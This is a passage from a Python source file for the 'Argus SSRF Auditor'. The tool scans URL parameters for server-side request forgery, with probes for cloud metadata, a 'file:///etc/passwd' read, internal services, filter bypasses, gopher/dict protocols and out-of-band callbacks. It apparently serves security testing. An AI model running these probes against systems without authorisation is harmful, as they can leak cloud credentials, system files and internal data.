        findings.extend(metadata_findings)

    # File read
    file_findings: list[SSRFinding] = []
    if test_file_read_enabled:
        file_findings = test_file_read(session, surface, baseline)
        findings.extend(file_findings)

    # Internal services
    if test_internal:
        findings.extend(test_internal_services(session, surface, baseline))

    # Protocol abuse (optional)
    if test_protocols:
        findings.extend(test_protocol_abuse(session, surface, baseline))

    # Bypasses only if the raw payload didn't confirm
    if test_bypass_enabled and not metadata_findings:
        findings.extend(test_bypass(
            session, surface, baseline,
            CLOUD_METADATA["aws_imdsv1"][0], METADATA_MARKERS, "metadata",
        ))
    if test_bypass_enabled and not file_findings:
        findings.extend(test_bypass(
            session, surface, baseline,
            "file:///etc/passwd", FILE_MARKERS, "file_read",
        ))

    return baseline, findings


# ═════════════════════════════════════════════════════════════════════════════
#  SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[SSRFinding]) -> None:
    if not findings:
        return
    if not DB_AVAILABLE or DB is None:
        log.warning("  DB sync: db.py not available")
        return
    if not _cfg("SYNC_TO_DB", True):
        log.info("  DB sync: SYNC_TO_DB is False")
        return
    if not _cfg("BRIDGE_ENABLED", False):
        log.info("  DB sync: BRIDGE_ENABLED is False")
        return
    if not DB.available:
        log.warning("  DB sync: bridge client not ready")
        return
    method = getattr(DB, "upsert_ssrf_findings", None)
    if method is None:
        log.warning(
            "  DB sync: db.py is missing upsert_ssrf_findings() — "
            "add the method to enable dedicated-table sync"
        )
        return
    try:
        payloads = [f.to_dict() for f in findings]
        result = method(scan_id, payloads)
        if result is None:
            log.warning("  DB sync: bridge returned None")
        else:
            log.info(f"  DB sync: {result} SSRF finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_ssrf_scan(
    urls_file: Path,
    outdir: Path,
    *,
    oob_domain: Optional[str] = None,
    use_interactsh: bool = False,
    headers: Optional[dict] = None,
    test_metadata: bool = True,
    test_file_read_enabled: bool = True,
    test_internal: bool = True,
    test_bypass_enabled: bool = True,
    test_protocols: bool = False,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _ssrf_settings()
    eff_rate     = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc     = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout  = timeout if timeout is not None else settings["timeout"]
    eff_max      = max_surfaces if max_surfaces is not None else settings["max_surfaces"]

    urls = _load_urls(urls_file)
    if len(urls) > MAX_URLS:
        log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
        urls = urls[:MAX_URLS]
    outdir.mkdir(parents=True, exist_ok=True)

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    # ── Discover surfaces (query + body)
    surfaces = discover_query_surfaces(urls)
    surfaces.extend(discover_body_surfaces(outdir))

    # Dedupe
    seen_s: set[tuple] = set()
    unique: list[dict] = []
    for s in surfaces:
        key = (s["url"], s["param"], s["location"])
        if key not in seen_s:
            seen_s.add(key)
            unique.append(s)
    surfaces = unique[:eff_max]

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} SSRF-prone parameter(s)")
    log.info(f"  Config : rate={eff_rate}/s  concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    log.info("")

    if not surfaces:
        log.warning("  No SSRF surfaces — writing empty report")
        return _write_empty_report(outdir, urls_file, start, total_input=len(urls))

    # ── OOB
    oob = OOBCapture(domain=oob_domain, use_interactsh=use_interactsh)
    oob_active = oob.start()

    # ── Shared session + rate limiter
    limiter = SharedRateLimiter(eff_rate)
    session = Session(limiter, cfg_hdrs, eff_timeout)

    # ── Parallel surface testing
    all_findings: list[SSRFinding] = []
    results: list[dict] = []

    def _process(surface: dict) -> tuple[dict, list[SSRFinding]]:
        try:
            baseline, findings = audit_surface(
                session, oob, surface,
                test_metadata=test_metadata,
                test_file_read_enabled=test_file_read_enabled,
                test_internal=test_internal,
                test_bypass_enabled=test_bypass_enabled,
                test_protocols=test_protocols,
            )
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"], "method": surface.get("method", "GET"),
                "baseline": baseline.to_dict(),
                "finding_count": len(findings),
            }, findings
        except Exception as e:
            log.debug(f"    error on {surface['url']}: {e}")
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"],
                "error": str(e),
            }, []

    log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
    with ThreadPoolExecutor(max_workers=eff_conc) as pool:
        futures = {pool.submit(_process, s): s for s in surfaces}
        done = 0
        for fut in as_completed(futures):
            done += 1
            try:
                result, findings = fut.result()
                results.append(result)
                if findings:
                    all_findings.extend(findings)
                    top = findings[0]
                    log.info(
                        f"    [{done:>3}/{len(surfaces)}] {top.technique:<10} "
                        f"{top.severity:<8} {result['url'][:50]} param={result['param']}"
                    )
                elif done % 10 == 0:
                    log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
            except Exception as e:
                log.debug(f"    future error: {e}")

    # ── OOB correlation pass (after all probes)
    if oob_active:
        all_findings = confirm_oob_batch(oob, all_findings)
    oob.stop()

    # ── Dedupe
    seen_f: set[tuple] = set()
    deduped: list[SSRFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique)
        if key not in seen_f:
            seen_f.add(key)
            f.auth_enabled = auth_on
            if not f.first_seen:
                f.first_seen = _db_now()
            deduped.append(f)

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    deduped.sort(key=lambda f: (
        SEV_ORDER.get(f.severity, 5), 0 if f.confirmed else 1,
        -f.confidence, f.target,
    ))

    # ── Write outputs
    elapsed = time.monotonic() - start
    by_severity = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_technique: dict[str, int] = {}
    confirmed_list = [f for f in deduped if f.confirmed]
    oob_findings = [f for f in deduped if f.technique == "oob"]
    oob_hits = [f for f in oob_findings if f.oob_confirmed]

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1

    (outdir / "ssrf_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t{f.confidence}\t"
            f"{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )
    (outdir / "ssrf_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.payload[:150]}"
            for f in confirmed_list
        ) + ("\n" if confirmed_list else "")
    )
    (outdir / "ssrf_oob.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.oob_token}\t{f.severity}\t"
            f"{'CONFIRMED' if f.oob_confirmed else 'pending'}"
            for f in oob_findings
        ) + ("\n" if oob_findings else "")
    )

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "config": {
            "oob_domain":      oob_domain,
            "interactsh":      use_interactsh,
            "rate_limit":      eff_rate,
            "concurrency":     eff_conc,
            "timeout":         eff_timeout,
            "test_metadata":   test_metadata,
            "test_file_read":  test_file_read_enabled,
            "test_internal":   test_internal,
            "test_bypass":     test_bypass_enabled,
            "test_protocols":  test_protocols,
        },
        "totals": {
            "urls_input":       len(urls),
            "surfaces_tested":  len(surfaces),
            "total_findings":   len(deduped),
            "confirmed":        len(confirmed_list),
            "oob_findings":     len(oob_findings),
            "oob_confirmed":    len(oob_hits),
            "critical":         by_severity["CRITICAL"],
            "high":             by_severity["HIGH"],
            "medium":           by_severity["MEDIUM"],
            "low":              by_severity["LOW"],
        },
        "summary": {
            "by_severity":  by_severity,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
        },
        "results":  results,
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "ssrf_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── Self-sync
    if scan_id is not None:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)
    else:
        log.info("")
        log.info("  DB sync  : deferred to main.py (no scan_id passed)")

    # ── Summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    ssrf_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    ssrf_confirmed.txt           {len(confirmed_list):>5} confirmed")
    log.info(f"    ssrf_oob.txt                 {len(oob_findings):>5} OOB finding(s)")
    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )
    if by_technique:
        log.info("  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))
    log.info(f"  Confirmed: {len(confirmed_list)}/{len(deduped)}  ·  OOB hits: {len(oob_hits)}")

    if confirmed_list:
        log.info("")
        log.info("  Confirmed SSRF findings:")
        for f in confirmed_list[:10]:
            log.info(f"    [{f.severity:<8}] {f.technique:<10} {f.param:<15} {f.target[:55]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": False,
        "config": {},
        "totals": {
            "urls_input": total_input, "surfaces_tested": 0,
            "total_findings": 0, "confirmed": 0, "oob_findings": 0,
            "oob_confirmed": 0, "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}},
        "results": [],
        "findings": [],
    }
    path = outdir / "ssrf_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("ssrf_candidates.txt", "ssrf_confirmed.txt", "ssrf_oob.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_ssrf.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"

    parser = argparse.ArgumentParser(description="Argus SSRF Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=base / "output")
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--oob-domain", help="OOB domain (manual)")
    parser.add_argument("--interactsh", action="store_true", help="Spawn interactsh-client")
    parser.add_argument("--no-metadata", action="store_true")
    parser.add_argument("--no-file-read", action="store_true")
    parser.add_argument("--no-internal", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--protocols", action="store_true", help="Enable gopher/dict (higher risk)")
    parser.add_argument("--max-surfaces", type=int, default=None)
    args = parser.parse_args()

    hdrs = {"Cookie": args.cookie} if args.cookie else None

    try:
        run_ssrf_scan(
            args.input, args.output,
            oob_domain=args.oob_domain,
            use_interactsh=args.interactsh,
            headers=hdrs,
            test_metadata=not args.no_metadata,
            test_file_read_enabled=not args.no_file_read,
            test_internal=not args.no_internal,
            test_bypass_enabled=not args.no_bypass,
            test_protocols=args.protocols,
            max_surfaces=args.max_surfaces,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            timeout=args.timeout,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
